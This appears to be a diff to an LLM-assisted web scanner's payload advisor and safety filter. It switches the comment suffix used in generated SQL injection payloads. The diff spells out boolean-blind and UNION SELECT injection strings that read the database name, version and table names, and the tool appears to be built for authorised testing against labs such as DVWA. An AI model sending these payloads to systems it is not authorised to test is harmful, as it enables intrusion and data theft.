@@ -32,6 +32,8 @@ ADVISORY_CATEGORIES = {
     "command_injection": "command_injection",
 }
 
+SQL_COMMENT_SUFFIX = "-- -"
+
 
 @dataclass(frozen=True)
 class FilteredPayload:
@@ -101,16 +103,16 @@ class PayloadSafetyFilter:
         filtered: list[dict[str, Any]] = []
         pair_index = 0
         for candidate in candidates:
-            true_payload = str(candidate.get("true_payload") or "").strip()
-            false_payload = str(candidate.get("false_payload") or "").strip()
-            if true_payload or false_payload:
+            true_payload = str(candidate.get("true_payload") or "")
+            false_payload = str(candidate.get("false_payload") or "")
+            if true_payload.strip() or false_payload.strip():
                 pair_index += 1
                 pair_id = str(candidate.get("pair_id") or f"pair-{pair_index:03d}")
                 for role, payload, signal_key in (
                     ("true", true_payload, "expected_true_signal"),
                     ("false", false_payload, "expected_false_signal"),
                 ):
-                    if not payload:
+                    if not payload.strip():
                         continue
                     filtered.append(
                         self._filter_one(
@@ -123,8 +125,8 @@ class PayloadSafetyFilter:
                     )
                 continue
 
-            payload = str(candidate.get("payload") or "").strip()
-            if not payload:
+            payload = str(candidate.get("payload") or "")
+            if not payload.strip():
                 continue
             filtered.append(self._filter_one(candidate, payload))
         return filtered
@@ -366,8 +368,8 @@ class LLMPayloadAdvisor:
                 "input_point": input_point,
                 "category": "sqli_blind",
                 "target_param": target_param,
-                "true_payload": "1' AND LENGTH(database())>0 #",
-                "false_payload": "1' AND LENGTH(database())=0 #",
+                "true_payload": f"1' AND LENGTH(database())>0 {SQL_COMMENT_SUFFIX}",
+                "false_payload": f"1' AND LENGTH(database())=0 {SQL_COMMENT_SUFFIX}",
                 "expected_true_signal": "true 条件响应应接近基线或已确认的存在态响应。",
                 "expected_false_signal": "false 条件响应应与 true 条件存在稳定差异。",
                 "purpose": "确认布尔型 SQLi 后的只读推进候选：验证 database() 是否可被条件表达式影响",
@@ -422,7 +424,7 @@ class LLMPayloadAdvisor:
         for position, expression in replacements.items():
             if 1 <= position <= column_count:
                 columns[position - 1] = expression
-        return f"-1' UNION SELECT {','.join(columns)}{suffix}-- "
+        return f"-1' UNION SELECT {','.join(columns)}{suffix} {SQL_COMMENT_SUFFIX}"
 
     def _safe_int(self, value: object) -> int:
         try:
@@ -492,8 +494,8 @@ class LLMPayloadAdvisor:
                     "input_point": input_point,
                     "category": "sqli_blind",
                     "target_param": name,
-                    "true_payload": "1' AND '1'='1' #",
-                    "false_payload": "1' AND '1'='2' #",
+                    "true_payload": f"1' AND '1'='1' {SQL_COMMENT_SUFFIX}",
+                    "false_payload": f"1' AND '1'='2' {SQL_COMMENT_SUFFIX}",
                     "expected_true_signal": "true 条件应接近基线，例如 DVWA 返回 User ID exists in the database.",
                     "expected_false_signal": "false 条件应与 true 条件明显不同，例如 DVWA 返回 User ID is MISSING from the database.",
                     "purpose": "成对验证布尔型 SQL 盲注响应差异；单条响应不能证明漏洞成立",
@@ -702,9 +704,9 @@ class LLMPayloadAdvisor:
                     "prefer_read_only_progression": True,
                     "max_per_param": self.settings.llm_payload_max_per_param,
                     "allowed_examples": [
-                        "-1' UNION SELECT 1,database(),3-- ",
-                        "-1' UNION SELECT 1,version(),3-- ",
-                        "-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1-- ",
+                        "-1' UNION SELECT 1,database(),3 -- -",
+                        "-1' UNION SELECT 1,version(),3 -- -",
+                        "-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- -",
                     ],
                 },
                 "output_schema": {
